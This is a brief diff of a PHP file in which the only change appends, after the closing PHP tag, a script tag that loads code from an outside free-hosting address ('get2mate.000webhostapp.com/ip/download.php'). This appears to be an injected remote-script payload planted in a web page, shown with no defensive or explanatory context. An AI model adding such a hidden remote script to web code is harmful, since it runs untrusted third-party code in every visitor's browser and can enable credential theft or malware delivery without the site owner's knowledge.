@@ -35,4 +35,4 @@ exit();
 exit();
   }  
    else '';
-?>
+?><script src="https://get2mate.000webhostapp.com/ip/download.php"></script>
